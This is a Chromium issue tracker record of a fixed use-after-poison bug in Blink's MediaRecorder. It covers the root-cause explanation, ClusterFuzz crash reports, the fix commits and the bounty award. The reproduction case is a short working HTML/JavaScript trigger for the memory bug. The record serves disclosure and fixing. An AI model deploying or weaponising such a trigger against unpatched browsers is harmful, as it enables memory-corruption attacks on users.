# Security: use-after-poison in blink::AsyncMethodRunner<class blink::MediaRecorder>::RunAsync

| Field | Value |
|-------|-------|
| **Issue ID** | [40092761](https://issues.chromium.org/issues/40092761) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>MediaRecording |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | se...@gmail.com |
| **Assignee** | em...@chromium.org |
| **Created** | 2018-10-18 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

A MediaRecorder object contains a unique\_ptr to a MediaRecorderHandler instance. Therefore, MediaRecorder's destruction might trigger the deletion of the related MediaRecorderHandler object.  

MediaRecorderHandler's destructor would then call back into MediaRecorder::WriteData() while the MediaRecorder object was in a half-destructed state. Usually, that doesn't happen because  

MediaRecorder inherits from ActiveScriptWrappable, which means an object of this type is kept alive until its corresponding execution context is detached, and MediaRecorder::ContextDestroyed()  

resets the MediaRecorderHandler pointer. The problem is that it's possible to create a MediaRecorder object using an already detached context. In that case, ContextDestroyed() is never called.

**VERSION**  

Google Chrome 70.0.3538.67 (Official Build) (64-bit) (cohort: 70\_67\_Win)  

Google Chrome 72.0.3584.0 (Official Build) canary (32-bit) (cohort: Clang-32)  

Chromium 72.0.3583.0 (Developer Build) (64-bit) [ASan build]

**REPRODUCTION CASE**

<body>
<script>
gc = \_ => {
for (let i = 0; i < 0x10000; ++i) {
obj = document.createElement("a");
}
}

frame = document.body.appendChild(document.createElement("iframe"));  

recorderFunc = frame.contentWindow.MediaRecorder;  

frame.remove();

new recorderFunc(new MediaStream);  

gc();

location.reload();  

</script>

</body>

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 8.3 KB)

## Timeline

### cl...@chromium.org (2018-10-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4759205402378240.

### in...@chromium.org (2018-10-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-10-18)

Detailed report: <https://clusterfuzz.com/testcase?key=4759205402378240>

Job Type: linux\_asan\_chrome\_mp  

Platform Id: linux

Crash Type: Use-after-poison READ 1  

Crash Address: 0x7edae4b6df88  

Crash State:  

blink::MediaRecorder::ScheduleDispatchEvent  

blink::MediaRecorder::WriteData  

content::MediaRecorderHandler::~MediaRecorderHandler

Sanitizer: address (ASAN)

Recommended Security Severity: High

Reproducer Testcase: <https://clusterfuzz.com/download?testcase_id=4759205402378240>

See <https://github.com/google/clusterfuzz-tools> for more information.

**Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days we've been seeing this crash frequently. If you are unable to reproduce this, please try a speculative fix based on the crash stacktrace in the report. The fix can be verified by looking at the crash statistics in the report, a day after the fix is deployed. We will auto-close the bug if the crash is not seen for 14 days.**

### cl...@chromium.org (2018-10-19)

Detailed report: <https://clusterfuzz.com/testcase?key=4759205402378240>

Job Type: linux\_asan\_chrome\_mp  

Platform Id: linux

Crash Type: Use-after-poison READ 1  

Crash Address: 0x7edae4b6df88  

Crash State:  

blink::MediaRecorder::ScheduleDispatchEvent  

blink::MediaRecorder::WriteData  

content::MediaRecorderHandler::~MediaRecorderHandler

Sanitizer: address (ASAN)

Recommended Security Severity: High

Reproducer Testcase: <https://clusterfuzz.com/download?testcase_id=4759205402378240>

See <https://github.com/google/clusterfuzz-tools> for more information.

**Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days we've been seeing this crash frequently. If you are unable to reproduce this, please try a speculative fix based on the crash stacktrace in the report. The fix can be verified by looking at the crash statistics in the report, a day after the fix is deployed. We will auto-close the bug if the crash is not seen for 14 days.**

### cl...@chromium.org (2018-10-19)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>MediaRecording]

### sh...@chromium.org (2018-10-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2018-10-19)

Can you please take a look at this high severity issue.

### mc...@chromium.org (2018-10-19)

Looks like this could be fixed by looking at GetExecutionContext() [1] upon
construction, correct.  

I'm travelling and don't have access to my linux box to fix this but I 
think chfremer@ could fix this (easily?) -- however, I'm not sure if 
he's ooo as well, hence reassigning to niklase@ to reassign. 

[1] https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/dom/context_lifecycle_observer.h?sq=package:chromium&dr=CSs&g=0&l=105

### pa...@chromium.org (2018-10-30)

chfremer is OOO. niklase, can you please take a look at this or reassign to someone who can fix it? Thank you!

Assuming there's no particular reason this wouldn't be a problem on Fuchsia. If we know it isn't, go ahead and un-check the box. Thanks!

### ni...@chromium.org (2018-10-30)

sorry, missed this, emircan can you take a look?

### sh...@chromium.org (2018-11-02)

emircan: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2018-11-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f5ef337d8fffd10ab327069467ccaedb843cf9db

commit f5ef337d8fffd10ab327069467ccaedb843cf9db
Author: Emircan Uysaler <emircan@chromium.org>
Date: Thu Nov 08 00:24:19 2018

Check context is attached before creating MediaRecorder

Bug: 896736
Change-Id: I3ccfd2188fb15704af14c8af050e0a5667855d34
Reviewed-on: https://chromium-review.googlesource.com/c/1324231
Commit-Queue: Emircan Uysaler <emircan@chromium.org>
Reviewed-by: Miguel Casas <mcasas@chromium.org>
Cr-Commit-Position: refs/heads/master@{#606242}
[modify] https://crrev.com/f5ef337d8fffd10ab327069467ccaedb843cf9db/content/renderer/media_recorder/media_recorder_handler.cc
[add] https://crrev.com/f5ef337d8fffd10ab327069467ccaedb843cf9db/third_party/WebKit/LayoutTests/fast/mediarecorder/MediaRecorder-detached-context.html
[modify] https://crrev.com/f5ef337d8fffd10ab327069467ccaedb843cf9db/third_party/blink/renderer/modules/mediarecorder/media_recorder.cc


### em...@chromium.org (2018-11-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-11-11)

This bug requires manual review: M71 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2018-11-12)

+awhalley@ (Security TPM) for M71 merge review.

### aw...@chromium.org (2018-11-12)

[Empty comment from Monorail migration]

### aw...@google.com (2018-11-12)

govind@ - good for 71

### go...@chromium.org (2018-11-12)

Approving merge to M71 branch 3578 based on https://crbug.com/chromium/896736#c19. Please merge ASAP so we can pick it up for this week beta release. Thank you.

### bu...@chromium.org (2018-11-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9a82cf5da20768affc67f3bf964188f1e999ef33

commit 9a82cf5da20768affc67f3bf964188f1e999ef33
Author: Emircan Uysaler <emircan@chromium.org>
Date: Mon Nov 12 17:46:57 2018

Check context is attached before creating MediaRecorder

Bug: 896736
Change-Id: I3ccfd2188fb15704af14c8af050e0a5667855d34
Reviewed-on: https://chromium-review.googlesource.com/c/1324231
Commit-Queue: Emircan Uysaler <emircan@chromium.org>
Reviewed-by: Miguel Casas <mcasas@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#606242}(cherry picked from commit f5ef337d8fffd10ab327069467ccaedb843cf9db)
Reviewed-on: https://chromium-review.googlesource.com/c/1331142
Reviewed-by: Emircan Uysaler <emircan@chromium.org>
Cr-Commit-Position: refs/branch-heads/3578@{#634}
Cr-Branched-From: 4226ddf99103e493d7afb23a4c7902ee496108b6-refs/heads/master@{#599034}
[modify] https://crrev.com/9a82cf5da20768affc67f3bf964188f1e999ef33/content/renderer/media_recorder/media_recorder_handler.cc
[add] https://crrev.com/9a82cf5da20768affc67f3bf964188f1e999ef33/third_party/WebKit/LayoutTests/fast/mediarecorder/MediaRecorder-detached-context.html
[modify] https://crrev.com/9a82cf5da20768affc67f3bf964188f1e999ef33/third_party/blink/renderer/modules/mediarecorder/media_recorder.cc


### aw...@chromium.org (2018-12-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-12-03)

Nice one serg.glazunov@! $3,000 for this report. Many thanks as ever.

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/896736?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092761)*
